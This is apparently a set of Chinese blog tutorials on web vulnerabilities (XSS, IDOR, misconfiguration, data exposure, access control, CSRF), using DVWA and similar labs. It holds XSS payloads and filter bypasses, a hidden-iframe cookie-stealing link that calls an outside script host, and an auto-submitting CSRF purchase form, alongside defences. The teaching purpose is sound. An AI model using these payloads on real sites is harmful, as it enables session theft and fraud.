## XSS的攻击载荷

以下所有标签的 > 都可以用 // 代替， 例如 <script>alert(1)</script//

**<script>标签**：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中

    
        

**svg标签**

    
        

**<img>标签**：

    
        

** <body>标签**：

    
        

**video标签:**

    <video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
        

**style标签：**

    <style οnlοad=alert(1)></style>
        

## XSS可以插在哪里？

*   用户输入作为script标签内容
*   用户输入作为HTML注释内容
*   用户输入作为HTML标签的属性名
*   用户输入作为HTML标签的属性值
*   用户输入作为HTML标签的名字
*   直接插入到CSS里
*   最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！

    
        

## XSS漏洞的挖掘

**黑盒测试**

尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：

*   URL的每一个参数
*   URL本身
*   表单
*   搜索框

**常见业务场景**

*   重灾区：评论区、留言区、个人信息、订单信息等
*   针对型：站内信、网页即时通讯、私信、意见反馈
*   存在风险：搜索框、当前目录、图片属性等

**白盒测试(代码审计)**

关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。

PHP中常见的接收参数的方式有`$_GET`、`$_POST`、`$_REQUEST`等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。

也可以搜索类似`echo`这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。

大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。

同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。

## XSS的攻击过程

**反射型XSS漏洞：**

1.  Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。
2.  Tom 发现 Bob的站点存在反射性的XSS漏洞
3.  Tom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击
4.  Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接
5.  嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。
6.  Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制

**存储型XSS漏洞：**

1.  Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。
2.  Tom检测到Bob的站点存在存储型的XSS漏洞。
3.  Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。
4.  Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。
5.  Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击

## XSS漏洞的危害

从以上我们可以知道，存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。

那么，利用XSS漏洞可以干什么呢？

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190115095422260.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

如果我们的JS水平一般的话，我们可以利用网上免费的XSS平台来构造代码实施攻击。

## XSS漏洞的简单攻击测试

### 反射型XSS：

先放出源代码

    
        

 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180909075343238%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

所以，我们可以在输入框中提交数据： <script>alert('hack')</script> ，看看会有什么反应

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180908094134553%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

页面直接弹出了hack的页面，可以看到，我们插入的语句已经被页面给执行了。-
这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： 前端-->后端-->前端

### 存储型XSS：

先给出源代码

    
        

这里有一个用户提交的页面，数据提交给后端之后，后端存储在数据库中。然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180909075606886%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

我们输入 1 和 <script>alert(\\'hack\\')</script> ，注意，这里的hack的单引号要进行转义，因为sql语句中的$name是单引号的，所以这里不转义的话就会闭合sql语句中的单引号。不然注入不进去。提交了之后，我们看看数据库

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180908102257643%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

可以看到，我们的XSS语句已经插入到数据库中了-
然后当其他用户访问 show2.php 页面时，我们插入的XSS代码就执行了。-
存储型XSS的数据流向是：前端-->后端-->数据库-->后端-->前端

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180908102309350%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

### DOM型XSS：

先放上源代码

    
        

 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180909075918515%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

我们可以输入 <img src=1 οnerrοr=alert('hack')> ，然后看看页面的变化

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180909080035608%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。-
这就是DOM型XSS漏洞，这种漏洞数据流向是： 前端-->浏览器

## XSS的简单过滤和绕过

前面讲sql注入的时候，我们讲过程序猿对于sql注入的一些过滤，利用一些函数（如：preg\_replace()），将组成sql语句的一些字符给过滤，以防止注入。那么，程序猿也可以用一些函数将构成xss代码的一些关键字符给过滤了。可是，道高一尺魔高一丈，虽然过滤了，但是还是可以进行过滤绕过，以达到XSS攻击的目的。

**一：区分大小写过滤标签**

先放上源代码

    
        

 绕过技巧：可以使用大小写绕过 <scripT>alert('hack')</scripT>

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180909082430512%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

**二：不区分大小写过滤标签**

先放上源代码

这个和上面的代码一模一样，只不过是过滤的时候多加了一个 i ，以不区分大小写

    
        

 绕过技巧：可以使用嵌套的script标签绕过 <scr<script>ipt>alert('hack')</scr</script>ipt>

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018090908271884%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

**三：不区分大小写，过滤之间的所有内容**

先放上源代码

这个和上面的代码一模一样，只不过是过滤的时候过滤条件发生了变化

    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); //过滤了<script  及其之间的所有内容
        

虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。

payload： <img src=1 οnerrοr=alert('hack')>

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180916092039141%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

我们可以输入 <img src=1 οnerrοr=alert('hack')> ，然后看看页面的变化

 ![ ](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180916092115389%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-
XSS的防御

XSS防御的总体思路是：**对用户的输入(和URL参数)进行过滤，对输出进行html编码**。也就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。

对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。

对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。

如下，是使用php中的htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体

    
        

如下，图一是没有进行html编码的，图2是进行了html编码的。经过html编码后script标签被当成了html实体。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190128202918105.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190128203026880.png)

**我们还可以服务端设置会话Cookie的HTTP Only属性**，这样，客户端的JS脚本就不能获取Cookie信息了

## 反射型XSS的利用姿势

我们现在发现一个网站存在反射型XSS，当用户登录该网站时，我们通过诱使用户点击我们精心制作的恶意链接，来盗取用户的Cookie并且发送给我们，然后我们再利用盗取的Cookie以用户的身份登录该用户的网站。

### get型

当我们输入参数的请求类型的get类型的，即我们输入的参数是以URL参数的形式。如下图

该链接的为：[http://127.0.0.1/vulnerabilities/xss\_r/?name=<script>alert(/xss/)</script>](http://127.0.0.1/vulnerabilities/xss_r/?name=)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190128204637630.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

那么，我们要怎么构造恶意代码来诱使用户点击并且用户点击后不会发现点击了恶意链接呢？

我们构造了如下代码，将其保存为html页面，然后放到我们自己的服务器上，做成一个链接。当用户登录了存在漏洞的网站，并且用户点击了我们构造的恶意链接时，该链接页面会偷偷打开iframe框架，iframe会访问其中的链接，然后执行我们的js代码。该js代码会把存在漏洞网站的cookie发送到我们的平台上，但是用户却浑然不知，他会发现打开的是一个404的页面！

    <iframe src="http://127.0.0.1/vulnerabilities/xss_r/?name=<script src=https://t.cn/EtxZt8T></script>" style="display:none;"></iframe>
        

    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190415092259653.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

而我们的XSS平台将得到用户的Cookie，然后我们就可以利用得到的Cookie以用户的身份访问该网站了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190128220003931.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

注：我们的攻击代码可以利用的前提是存在XSS漏洞的网站的X-Frame-options未配置，并且会话Cookie没有设置Http Only属性

### post型

我们现在知道一个网站的用户名输入框存在反射型的XSS漏洞

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2019013018333170.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

我们抓包查看

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190130191523710.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

我们构造了如下代码，将其保存为html页面，然后放到我们自己的服务器上，做成一个链接。当用户登录了存在漏洞的网站，并且用户点击了我们构造的恶意链接时，该恶意链接的页面加载完后会执行js代码，完成表单的提交，表单的用户名参数是我们的恶意js代码。提交完该表单后，该js代码会把存在漏洞网站的cookie发送到我们的平台上，但是用户却浑然不知，他会发现打开的是一个404的页面。

我们这里写了一个404页面，404页面中隐藏了一个form提交的表单，为了防止提交表单后跳转，我们在表单下加了一个iframe框架，并且iframe框架的name等于form表单的target，并且我们设置iframe框架为不可见。

    
        

当用户点击了我们构造的恶意链接，发现打开的是一个404页面。实际上这个页面偷偷的进行了表单的提交。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190130192802545.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

而我们的XSS平台也收到了发送来的数据(这数据中没有Cookie的原因是这个网站我没设置Cookie，只是随便写的一个页面)。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190130192932750.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## 利用JS将用户信息发送给后台

    
        

当用户访问了该页面，我们后台就可以看到用户访问记录。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190412171825660.png)

相关文章：[DVWA之DOM XSS(DOM型跨站脚本攻击)](https://blog.csdn.net/qq_36119192/article/details/82932557)

 [DVWA之Reflected XSS(反射型XSS)](https://blog.csdn.net/qq_36119192/article/details/82935440#High)

 [DVWA之Stored XSS(存储型XSS)](https://blog.csdn.net/qq_36119192/article/details/82935895)

 [挖洞经验丨印尼电商平台Tokopedia的反射型XSS漏洞](https://www.freebuf.com/vuls/207025.html)

### 

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103192920)
# 不安全的直接对象引用

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171581)

### 目录

*   定义
*   出现的原因
*   场景案例
*   如何防范

## 定义

不安全的直接对象引用（IDOR）允许攻击者绕过网站的身份验证机制，并通过修改指向对象链接中的参数值来直接访问目标对象资源，这类资源可以是属于其他用户的数据库条目以及服务器系统中的隐私文件等等。-
应用程序在SQL查询语句中直接使用了未经测试的数据，而攻击者可以利用这一点来访问数据库中的其他账号数据。

## 出现的原因

1.  Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时来检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。
2.  服务器上的具体文件名、路径或数据库关键字等内部资源被暴露在URL或网页中，攻击者可以尝试直接访问其他资源。

## 场景案例

**篡改他人邮箱**-
以BTS PenTesting Lab中的实验为例，分别创建123，abc两个账号和相应的邮箱。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120210736376.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120210741301.png)-
登陆abc的账号，在执行邮箱修改操作时，用brupsuite抓包-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120210747254.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
将其用户标识id=5改为123用户的标识id=4，然后发包-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2019112021074979.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
随后登录123的账号，发现邮箱被篡改-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120210800239.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
这只是一个简单的演示，关于此漏洞的利用还有很多比如可以抓包改支付金额啊，改用户密码啊，将提升自己权限等。有兴趣朋友可以深入了解一下。

## 如何防范

1.使用基于用户或会话的间接对象访问，这样可防止攻击者直接攻击未授权资源-
2.访问检查：对任何来自不受信源所使用的所有对象进行访问控制检查-
3.避免在url或网页中直接引用内部文件名或数据库关键字-
4.验证用户输入和url请求，拒绝包含./ …/的请求

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171581)
# 安全配置错误

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171707)

### 目录

*   定义
*   影响
*   检测场景
*   防御措施

## 定义

安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务，平台，web服务器、应用服务器、数据库、[框架](https://so.csdn.net/so/search?q=%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020)、自定义的代码、预安装的虚拟机、容器、存储等。这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。-
堆栈详解传送门——>[传送门](https://blog.csdn.net/whoim_i/article/details/103171641)

## 影响

攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。

## 检测场景

A:应用程序启用或者安装了不必要的安全功能-
B:默认账户名和密码没有修改-
C:应用软件已过期或易受攻击-
D:应用程序服务器，应用程序框架等未进行安全配置。-
E:错误处理机制披露大量敏感信息-
F:对于更新的系统，禁用或不安全地配置安全功能。

## 防御措施

1、 配置所有的安全机制-
2、 最小原则，关掉或限制不使用的服务-
3、 更改默认账户信息-
4、 使用日志和警报-
5、 回显信息不显示任何与实际错误相关的信息-
6、 检查和修复安全配置项

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171707)
# 敏感信息泄露

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171726)

### 目录

*   漏洞描述
*   检测方法
*   项目案例
*   防范措施

## 漏洞描述

由于管理员或者技术人员等各种原因导致敏感信息泄露。许多web应用程序和[api](https://so.csdn.net/so/search?q=api&spm=1001.2101.3001.7020)都无法正确保护敏感数据，攻击者可以通过窃取或修改未改加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。

## 检测方法

1、 手工挖掘，查看web容器或网页源码代码，可能存在敏感信息。比如访问url下的目录，直接列出了目录下的文件列表，错误的报错信息包含了网站的信息。-
2、 工具挖掘，像爬虫之类的工具可以扫描到敏感文件路径，从而找到敏感数据。

## 项目案例

在pikachu这个靶场里就有这个敏感信息泄露。-
在前端代码中泄露了一个账号信息-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120211544610.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120211555486.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

在cookie里面还泄露了密码信息-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120211604615.png)

## 防范措施

1、 对系统处理、存储或传输的数据进行分类，根据分类进行访问控制。-
2、 对用户敏感信息的传输和存储进行[加密](https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020)-
3、 强化安全意识

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171726)
# 缺少功能级的访问控制

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171751)

### 目录

*   概念原理
*   测试方法
*   后果危害
*   防御措施

## 概念原理

大多数Web应用程序的功能在UI页面显示之前,会验证功能级别的[访问权限](https://so.csdn.net/so/search?q=%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)。但是,应用程序需要在每个功能被访问时在服务器端执行相同的访问控制检查。如果请求没有被验证,攻击者能够伪造请求从而在未经适当授权时访问功能。-
比如：对于测试登录页面功能级访问控制是否缺失，需要测试-
a：合法用户是否能够正常登录，并且访问到登录之后的页面-
b：匿名或者攻击者等没有权限的用户是否会被拒绝登录，并且不能访问到需要登录之后才能访问到的页面。

## 测试方法

1、 保证合法授权用户可以访问成功-
2、 限制非法未授权用户的访问

## 后果危害

很多系统的权限控制是通过页面灰化或隐藏URL实现的，没有在服务器端进行身份确认和权限验证，导致攻击者通过修改页面样式或获取隐藏URL，进而获取特权页面来对系统进行攻击，或者在匿名状态下对他人的页面进行攻击，从而获取用户数据或提升权限。-
如果是发生在后台，攻击者能够访问到正常用户才能访问到的页面，将对所有用户的安全问题造成威胁。

## 防御措施

1、 设计严格的权限控制系统，对于每个请求和URL都要进行校验和权限确认，防止非法请求被执行-
2、 对于每个功能的访问，都要有明确的角色授权，采用过滤器的方式校验每个请求的合法性-
3、 实现Web访问的IP白名单列表，禁止不可信的IP访问Web系统

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171751)
# 跨站请求伪造CSRF



### 目录

*   原理解释
*   CSRF分类
*   *   GET型
    *   POST型
*   CSRF漏洞挖掘
*   使用burpsuite快速生成CSRF poc
*   防御手段

## 原理解释

画个丑图来解释一波

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191120211848601.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
1、 用户输入账号信息请求登录A网站。-
2、 A网站验证用户信息，通过验证后返回给用户一个cookie-
3、 在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B-
4、 B网站收到用户请求后返回攻击性代码，构造访问A网站的语句-
5、 浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了！

两个条件：a 用户访问站点A并产生了cookie-
b 用户没有退出A同时访问了B

## CSRF分类

## GET型

如果一个网站某个地方的功能，比如用户修改邮箱是通过GET请求进行修改的。如：/user.php?id=1&email=123@163.com ，这个链接的意思是用户id=1将邮箱修改为123@163.com。 当我们把这个链接修改为 /user.php?id=1&email=abc@163.com ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，当用户刚好在访问这个网站，他同时又点击了这个链接，那么悲剧发生了。这个用户的邮箱被修改为 abc@163.com 了

## POST型

在普通用户的眼中，点击网页->打开试看视频->购买视频是一个很正常的一个流程。可是在攻击者的眼中可以算正常，但又不正常的，当然不正常的情况下，是在开发者安全意识不足所造成的。攻击者在购买处抓到购买时候网站处理购买(扣除)用户余额的地址。比如：/coures/user/handler/25332/buy.php 。通过提交表单，buy.php处理购买的信息，这里的25532为视频ID。那么攻击者现在构造一个链接，链接中包含以下内容。

    <form action=/coures/user/handler/25332/buy method=POST>
    <input type="text" name="xx" value="xx" />
    </form>
    <script> document.forms[0].submit(); </script>
    
        

当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作，自动购买了id为25332的视频，从而导致受害者余额扣除。

## CSRF漏洞挖掘

1、 抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞-
2、 如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。-
3、 利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等

## 使用burpsuite快速生成CSRF poc

当我们发现一个页面存在CSRF漏洞后，可以通过burpsuite快速生成攻击代码-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191124110209989.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
点击复制html ，然后保存在本地。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20191124110224315.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dob2ltX2k%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
双击打开，当受害者点击就执行了我们的CSRF代码-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F201911241102332.png)

## 防御手段

1、 验证http referer中记录的请求来源地址是否是合法用户地址（即最开始登录的来源地址）。但这只能进行简单的防御，因为这个地址可以人为的篡改。-
2、 重要功能点使用动态验证码进行CSRF防护-
3、 通过token方式进行CSRF防护，在服务器端对比POST提交参数的token与Session中绑定的token是否一致，以验证CSRF攻击-
